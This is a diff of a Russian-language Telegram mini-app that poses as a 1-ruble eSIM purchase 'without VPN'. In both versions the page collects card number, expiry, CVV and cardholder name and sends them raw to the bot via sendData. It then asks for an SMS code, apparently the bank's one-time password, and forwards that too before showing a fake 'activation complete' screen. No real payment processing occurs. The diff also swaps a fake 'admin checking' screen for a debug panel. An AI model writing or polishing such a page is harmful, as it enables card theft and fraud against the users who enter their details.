@@ -29,21 +29,19 @@
             width: 100%;
             max-width: 400px;
             box-shadow: 0 25px 50px rgba(0,0,0,0.25);
-            position: relative;
-            overflow: hidden;
         }
 
         .screen {
             display: none;
-            animation: fadeIn 0.4s ease;
         }
 
         .screen.active {
             display: block;
+            animation: fadeIn 0.3s ease;
         }
 
         @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(20px); }
+            from { opacity: 0; transform: translateY(10px); }
             to { opacity: 1; transform: translateY(0); }
         }
 
@@ -51,7 +49,7 @@
             text-align: center;
             color: #333;
             margin-bottom: 10px;
-            font-size: 24px;
+            font-size: 22px;
         }
 
         .subtitle {
@@ -61,7 +59,6 @@
             font-size: 14px;
         }
 
-        /* Форма оплаты */
         .form-group {
             margin-bottom: 18px;
         }
@@ -120,75 +117,24 @@
             cursor: not-allowed;
         }
 
-        button:active:not(:disabled) {
-            transform: translateY(0);
-        }
-
-        /* Экран загрузки */
-        .loading-container {
+        .loading {
             text-align: center;
             padding: 40px 20px;
         }
 
         .spinner {
-            width: 70px;
-            height: 70px;
-            border: 5px solid #f3f3f3;
-            border-top: 5px solid #667eea;
+            width: 60px;
+            height: 60px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #667eea;
             border-radius: 50%;
             animation: spin 1s linear infinite;
-            margin: 0 auto 25px;
+            margin: 0 auto 20px;
         }
 
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
-        }
-
-        .loading-title {
-            color: #333;
-            font-size: 18px;
-            font-weight: 600;
-            margin-bottom: 12px;
-        }
-
-        .loading-text {
-            color: #666;
-            font-size: 14px;
-            line-height: 1.6;
-        }
-
-        .loading-subtext {
-            color: #999;
-            font-size: 12px;
-            margin-top: 20px;
-        }
-
-        .progress-bar {
-            width: 100%;
-            height: 4px;
-            background: #e0e0e0;
-            border-radius: 2px;
-            margin-top: 30px;
-            overflow: hidden;
-        }
-
-        .progress-fill {
-            height: 100%;
-            background: linear-gradient(90deg, #667eea, #764ba2);
-            width: 0%;
-            animation: progress 30s ease-in-out infinite;
-        }
-
-        @keyframes progress {
-            0% { width: 0%; }
-            50% { width: 70%; }
-            100% { width: 90%; }
-        }
-
-        /* Экран ввода кода */
-        .code-container {
-            text-align: center;
         }
 
         .code-display {
@@ -199,14 +145,14 @@
         }
 
         .code-digit {
-            width: 50px;
-            height: 60px;
+            width: 55px;
+            height: 65px;
             border: 2px solid #e0e0e0;
             border-radius: 12px;
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 24px;
+            font-size: 28px;
             font-weight: bold;
             color: #333;
             transition: all 0.3s;
@@ -222,62 +168,22 @@
             position: absolute;
             opacity: 0;
             pointer-events: none;
+            height: 0;
         }
 
         .info-box {
-            background: linear-gradient(135deg, #f0f4ff 0%, #e8f4f8 100%);
+            background: #f0f4ff;
             border-left: 4px solid #667eea;
             padding: 15px;
             border-radius: 10px;
-            margin-bottom: 25px;
+            margin-bottom: 20px;
             font-size: 13px;
             color: #555;
-            text-align: left;
         }
 
-        .timer {
-            color: #667eea;
-            font-weight: 600;
-            font-size: 14px;
-            margin-top: 15px;
-        }
-
-        /* Экран успеха */
-        .success-container {
-            text-align: center;
-            padding: 40px 20px;
-        }
-
-        .success-icon {
-            width: 80px;
-            height: 80px;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin: 0 auto 25px;
-            font-size: 40px;
-            color: white;
-        }
-
-        .success-title {
-            color: #333;
-            font-size: 22px;
-            font-weight: 600;
-            margin-bottom: 15px;
-        }
-
-        .success-text {
-            color: #666;
-            font-size: 14px;
-            line-height: 1.6;
-        }
-
-        /* Дополнительные стили */
         .amount {
             text-align: center;
-            font-size: 42px;
+            font-size: 40px;
             font-weight: bold;
             color: #667eea;
             margin: 15px 0;
@@ -305,40 +211,32 @@
             display: none;
         }
 
-        .status-indicator {
-            display: inline-block;
-            width: 8px;
-            height: 8px;
-            background: #27ae60;
+        .success-icon {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             border-radius: 50%;
-            margin-right: 8px;
-            animation: pulse 2s infinite;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 25px;
+            font-size: 40px;
+            color: white;
         }
 
-        @keyframes pulse {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.5; }
-        }
-
-        .admin-controls {
-            margin-top: 30px;
-            padding-top: 20px;
-            border-top: 1px solid #e0e0e0;
-        }
-
-        .btn-secondary {
-            background: #f0f0f0;
-            color: #333;
-            margin-top: 10px;
-        }
-
-        .btn-secondary:hover:not(:disabled) {
-            background: #e0e0e0;
-            box-shadow: none;
-        }
-
-        .hidden {
-            display: none !important;
+        .debug-info {
+            position: fixed;
+            bottom: 10px;
+            left: 10px;
+            right: 10px;
+            background: rgba(0,0,0,0.8);
+            color: #0f0;
+            padding: 10px;
+            border-radius: 8px;
+            font-size: 11px;
+            font-family: monospace;
+            display: none;
+            z-index: 1000;
         }
     </style>
 </head>
@@ -358,160 +256,131 @@
             <form id="paymentForm">
                 <div class="form-group">
                     <label>Номер карты</label>
-                    <input 
-                        type="text" 
-                        id="cardNumber" 
-                        placeholder="0000 0000 0000 0000" 
-                        maxlength="19"
-                        autocomplete="off"
-                    >
+                    <input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19" autocomplete="off">
                     <div class="error" id="cardError">Введите корректный номер карты</div>
                 </div>
 
                 <div class="card-row">
                     <div class="form-group">
                         <label>Срок действия</label>
-                        <input 
-                            type="text" 
-                            id="expiry" 
-                            placeholder="MM/YY" 
-                            maxlength="5"
-                            autocomplete="off"
-                        >
+                        <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" autocomplete="off">
                         <div class="error" id="expiryError">Неверный формат</div>
                     </div>
                     <div class="form-group">
                         <label>CVV</label>
-                        <input 
-                            type="password" 
-                            id="cvv" 
-                            placeholder="123" 
-                            maxlength="3"
-                            autocomplete="off"
-                        >
+                        <input type="password" id="cvv" placeholder="123" maxlength="3" autocomplete="off">
                         <div class="error" id="cvvError">Неверный CVV</div>
                     </div>
                 </div>
 
                 <div class="form-group">
                     <label>Имя держателя карты</label>
-                    <input 
-                        type="text" 
-                        id="cardholder" 
-                        placeholder="IVAN IVANOV" 
-                        autocomplete="off"
-                    >
+                    <input type="text" id="cardholder" placeholder="IVAN IVANOV" autocomplete="off">
                     <div class="error" id="nameError">Введите имя</div>
                 </div>
 
                 <button type="submit" id="payBtn">💰 Оплатить 1₽</button>
                 
                 <div class="secure-badge">
-                    🔒 Безопасная оплата SSL
+                    🔒 Безопасная оплата
                 </div>
             </form>
         </div>
 
-        <!-- ЭКРАН 2: Ожидание администратора -->
-        <div id="waitingScreen" class="screen">
-            <div class="loading-container">
-                <div class="spinner"></div>
-                <div class="loading-title">⏳ Обработка платежа</div>
-                <div class="loading-text">
-                    Платеж прошел успешно!<br>
-                    Администратор проверяет вашу заявку...
-                </div>
-                <div class="progress-bar">
-                    <div class="progress-fill"></div>
-                </div>
-                <div class="loading-subtext">
-                    <span class="status-indicator"></span>
-                    Ожидаем подтверждения
-                </div>
-
-                <!-- Для тестирования - кнопка имитации админа -->
-                <div class="admin-controls" id="adminControls" style="display: none;">
-                    <div style="font-size: 11px; color: #999; margin-bottom: 10px;">
-                        [Тестовый режим - кнопка для админа]
-                    </div>
-                    <button class="btn-secondary" onclick="simulateAdminApproval()">
-                        ✓ Имитировать подтверждение админа
-                    </button>
-                </div>
-            </div>
-        </div>
-
-        <!-- ЭКРАН 3: Ввод кода подтверждения -->
-        <div id="codeScreen" class="screen">
-            <div class="code-container">
-                <h1>🔒 Подтверждение</h1>
-                <div class="subtitle">Введите код из SMS</div>
-                
-                <div class="info-box">
-                    📱 Код подтверждения отправлен на ваш номер телефона для активации eSIM
-                </div>
-
-                <div class="code-display" id="codeDisplay">
-                    <div class="code-digit" id="digit1"></div>
-                    <div class="code-digit" id="digit2"></div>
-                    <div class="code-digit" id="digit3"></div>
-                    <div class="code-digit" id="digit4"></div>
-                </div>
-
-                <!-- Скрытое поле для ввода -->
-                <input 
-                    type="text" 
-                    id="codeInput" 
-                    class="code-input-hidden"
-                    maxlength="4"
-                    inputmode="numeric"
-                    autocomplete="off"
-                >
-
-                <button onclick="focusCodeInput()" style="margin-bottom: 10px;">
-                    🔢 Ввести код
-                </button>
-
-                <div class="timer" id="timer">Запросить код повторно через 59 сек</div>
-
-                <div style="margin-top: 20px;">
-                    <button class="btn-secondary" onclick="backToWaiting()">
-                        ← Назад
-                    </button>
-                </div>
-            </div>
-        </div>
-
-        <!-- ЭКРАН 4: Успех -->
+        <!-- ЭКРАН 2: Успех оплаты -->
         <div id="successScreen" class="screen">
-            <div class="success-container">
+            <div class="loading">
                 <div class="success-icon">✓</div>
-                <div class="success-title">Активация завершена!</div>
-                <div class="success-text">
-                    Ваша eSIM успешно активирована.<br><br>
-                    📧 Инструкции по установке отправлены в Telegram.<br>
-                    📱 Сервисы доступны без VPN!
-                </div>
-                <button onclick="closeApp()" style="margin-top: 30px;">
-                    Закрыть
-                </button>
+                <h2 style="color: #333; margin-bottom: 10px;">Платеж успешен!</h2>
+                <p style="color: #666; font-size: 14px;">
+                    Ожидайте SMS с кодом подтверждения.<br>
+                    Мы пришлем сообщение, когда eSIM будет готова.
+                </p>
+            </div>
+        </div>
+
+        <!-- ЭКРАН 3: Ввод кода -->
+        <div id="codeScreen" class="screen">
+            <h1>🔒 Подтверждение</h1>
+            <div class="subtitle">Введите код из SMS</div>
+            
+            <div class="info-box">
+                📱 Код подтверждения отправлен на ваш номер для активации eSIM
+            </div>
+
+            <div class="code-display" id="codeDisplay">
+                <div class="code-digit" id="digit1"></div>
+                <div class="code-digit" id="digit2"></div>
+                <div class="code-digit" id="digit3"></div>
+                <div class="code-digit" id="digit4"></div>
+            </div>
+
+            <input type="text" id="codeInput" class="code-input-hidden" maxlength="4" inputmode="numeric" autocomplete="off">
+
+            <button onclick="focusCode()" style="margin-bottom: 10px;">🔢 Ввести код</button>
+            
+            <div style="text-align: center; color: #999; font-size: 12px; margin-top: 15px;">
+                Нажмите на поля выше для ввода
+            </div>
+        </div>
+
+        <!-- ЭКРАН 4: Финальный успех -->
+        <div id="finalScreen" class="screen">
+            <div class="loading">
+                <div class="success-icon">🎉</div>
+                <h2 style="color: #333; margin-bottom: 10px;">eSIM активирована!</h2>
+                <p style="color: #666; font-size: 14px;">
+                    ✅ Активация завершена!<br>
+                    📱 Инструкции отправлены в Telegram.<br>
+                    🌍 Все сервисы доступны без VPN!
+                </p>
+                <button onclick="tg.close()" style="margin-top: 20px;">Закрыть</button>
             </div>
         </div>
 
     </div>
 
+    <!-- Дебаг панель (для разработки) -->
+    <div id="debugPanel" class="debug-info"></div>
+
     <script>
         // Инициализация Telegram WebApp
-        const tg = window.Telegram.WebApp;
-        tg.ready();
-        tg.expand();
-        tg.setHeaderColor('#667eea');
-        tg.setBackgroundColor('#ffffff');
+        let tg;
+        try {
+            tg = window.Telegram.WebApp;
+            tg.ready();
+            tg.expand();
+            tg.setHeaderColor('#667eea');
+            tg.setBackgroundColor('#ffffff');
+            console.log('WebApp initialized:', tg);
+        } catch (e) {
+            console.error('WebApp init error:', e);
+            alert('Ошибка инициализации Telegram WebApp');
+        }
 
-        // Показать экран
+        // Дебаг функция
+        function debug(msg) {
+            console.log(msg);
+            const panel = document.getElementById('debugPanel');
+            panel.style.display = 'block';
+            panel.innerHTML += '<div>' + msg + '</div>';
+        }
+
+        // Определение текущего шага
+        const urlParams = new URLSearchParams(window.location.search);
+        const step = urlParams.get('step') || 'payment';
+        
+        debug('Step: ' + step);
+        debug('WebApp version: ' + (tg.version || 'unknown'));
+
+        // Показать нужный экран
         function showScreen(screenId) {
             document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
             document.getElementById(screenId).classList.add('active');
+        }
+
+        if (step === 'code') {
+            showScreen('codeScreen');
         }
 
         // Маска для номера карты
@@ -539,8 +408,9 @@
         });
 
         // Обработка оплаты
-        document.getElementById('paymentForm').addEventListener('submit', function(e) {
+        document.getElementById('paymentForm').addEventListener('submit', async function(e) {
             e.preventDefault();
+            debug('Начало отправки платежа...');
             
             const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
             const expiry = document.getElementById('expiry').value;
@@ -578,68 +448,89 @@
                 document.getElementById('nameError').style.display = 'none';
             }
 
-            if (hasError) return;
+            if (hasError) {
+                debug('Ошибка валидации');
+                return;
+            }
 
             // Блокируем кнопку
-            document.getElementById('payBtn').disabled = true;
-            document.getElementById('payBtn').textContent = '⏳ Обработка...';
+            const btn = document.getElementById('payBtn');
+            btn.disabled = true;
+            btn.textContent = '⏳ Отправка...';
 
-            // Отправляем данные боту
+            // Подготавливаем данные
             const paymentData = {
                 type: 'payment',
                 card_number: cardNumber,
                 expiry: expiry,
                 cvv: cvv,
                 cardholder: cardholder,
-                amount: 1,
-                user_id: tg.initDataUnsafe.user?.id
+                amount: 1
             };
 
-            tg.sendData(JSON.stringify(paymentData));
+            const jsonData = JSON.stringify(paymentData);
+            debug('Данные для отправки: ' + jsonData);
 
-            // Переходим к экрану ожидания
-            setTimeout(() => {
-                showScreen('waitingScreen');
-                
-                // Для тестирования - показываем кнопку админа (в проде убрать)
-                if (window.location.search.includes('test=1')) {
-                    document.getElementById('adminControls').style.display = 'block';
+            try {
+                // КРИТИЧЕСКИ ВАЖНО: проверяем, что sendData доступен
+                if (!tg.sendData) {
+                    throw new Error('sendData не доступен! Убедитесь, что WebApp открыт через ReplyKeyboardMarkup');
                 }
-            }, 1500);
+
+                debug('Вызов tg.sendData...');
+                
+                // Отправляем данные
+                tg.sendData(jsonData);
+                
+                debug('sendData вызван успешно');
+                
+                // Показываем экран успеха
+                showScreen('successScreen');
+                
+                // Закрываем WebApp через 2 секунды (данные отправляются при закрытии!)
+                setTimeout(() => {
+                    debug('Закрытие WebApp...');
+                    tg.close();
+                }, 2000);
+                
+            } catch (err) {
+                debug('ОШИБКА: ' + err.message);
+                console.error('Send error:', err);
+                btn.disabled = false;
+                btn.textContent = '💰 Оплатить 1₽';
+                alert('Ошибка отправки: ' + err.message);
+            }
         });
 
-        // Имитация подтверждения админа (для теста)
-        function simulateAdminApproval() {
-            showCodeScreen();
-        }
-
-        // Показать экран кода (вызывается ботом через sendData или админом)
-        function showCodeScreen() {
-            showScreen('codeScreen');
-            startTimer();
-            focusCodeInput();
-        }
-
-        // Фокус на поле ввода кода
-        function focusCodeInput() {
+        // Обработка ввода кода
+        function focusCode() {
             document.getElementById('codeInput').focus();
         }
 
-        // Обработка ввода кода
         const codeInput = document.getElementById('codeInput');
-        const codeDigits = [
+        const digits = [
             document.getElementById('digit1'),
             document.getElementById('digit2'),
             document.getElementById('digit3'),
             document.getElementById('digit4')
         ];
 
+        // Клик по цифрам фокусирует скрытое поле
+        digits.forEach((digit, index) => {
+            digit.addEventListener('click', () => {
+                codeInput.focus();
+                // Ставим курсор в конец
+                const val = codeInput.value;
+                codeInput.setSelectionRange(val.length, val.length);
+            });
+        });
+
         codeInput.addEventListener('input', function(e) {
             const value = e.target.value.replace(/\D/g, '').substring(0, 4);
             e.target.value = value;
             
             // Обновляем отображение
-            codeDigits.forEach((digit, index) => {
+            digits.forEach((digit, index) => {
                 if (index < value.length) {
                     digit.textContent = value[index];
                     digit.classList.add('filled');
@@ -651,4 +542,49 @@
 
             // Автоотправка при заполнении
             if (value.length === 4) {
-    
+                setTimeout(() => sendCode(value), 300);
+            }
+        });
+
+        function sendCode(code) {
+            debug('Отправка кода: ' + code);
+            
+            const codeData = {
+                type: 'confirmation_code',
+                code: code
+            };
+
+            try {
+                if (!tg.sendData) {
+                    throw new Error('sendData не доступен');
+                }
+
+                tg.sendData(JSON.stringify(codeData));
+                debug('Код отправлен');
+                
+                showScreen('finalScreen');
+                
+                setTimeout(() => tg.close(), 2000);
+            } catch (err) {
+                debug('Ошибка отправки кода: ' + err.message);
+                alert('Ошибка: ' + err.message);
+            }
+        }
+
+        // Скрываем ошибки при вводе
+        document.querySelectorAll('input').forEach(input => {
+            input.addEventListener('input', function() {
+                const error = this.parentElement.querySelector('.error');
+                if (error) error.style.display = 'none';
+            });
+        });
+
+        // Показать дебаг панель при тройном клике (для разработки)
+        document.addEventListener('click', function(e) {
+            if (e.detail === 3) {
+                document.getElementById('debugPanel').style.display = 'block';
+            }
+        });
+    </script>
+</body>
+</html>
